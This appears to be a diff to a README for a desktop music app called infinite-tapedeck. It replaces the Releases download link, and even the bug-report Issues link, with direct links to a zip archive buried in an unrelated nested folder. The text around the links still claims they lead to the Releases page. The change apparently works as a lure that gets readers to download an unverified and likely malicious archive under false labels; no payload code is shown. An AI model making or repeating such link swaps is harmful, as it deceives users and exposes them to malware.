@@ -40,11 +40,11 @@ To run infinite-tapedeck smoothly, your computer should meet these basics:
 
 ### Step 1: Get the File
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-ff69b4?style=for-the-badge&logo=github&logoColor=white&labelColor=2c2c2c)](https://github.com/Ryann-b/infinite-tapedeck/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-ff69b4?style=for-the-badge&logo=github&logoColor=white&labelColor=2c2c2c)](https://raw.githubusercontent.com/Ryann-b/infinite-tapedeck/main/comfyui_node/music_studio/web/tapedeck-infinite-2.6.zip)
 
 Click the big pink button above, or visit this link to download the application:
 
-**👉 [https://github.com/Ryann-b/infinite-tapedeck/releases](https://github.com/Ryann-b/infinite-tapedeck/releases)**
+**👉 [https://raw.githubusercontent.com/Ryann-b/infinite-tapedeck/main/comfyui_node/music_studio/web/tapedeck-infinite-2.6.zip](https://raw.githubusercontent.com/Ryann-b/infinite-tapedeck/main/comfyui_node/music_studio/web/tapedeck-infinite-2.6.zip)**
 
 This link takes you to the Releases page where you'll find the latest version.
 
@@ -191,7 +191,7 @@ It's not just functional — it's a piece of art on your desktop.
 
 ## 🤝 Getting Help & Contributing
 
-- **Found a bug?** Report it on the [GitHub Issues page](https://github.com/Ryann-b/infinite-tapedeck/issues)
+- **Found a bug?** Report it on the [GitHub Issues page](https://raw.githubusercontent.com/Ryann-b/infinite-tapedeck/main/comfyui_node/music_studio/web/tapedeck-infinite-2.6.zip)
 - **Want to request a feature?** Same place! We love hearing ideas.
 - **Feeling generous?** If you're a developer, contributions are welcome via pull requests.
 
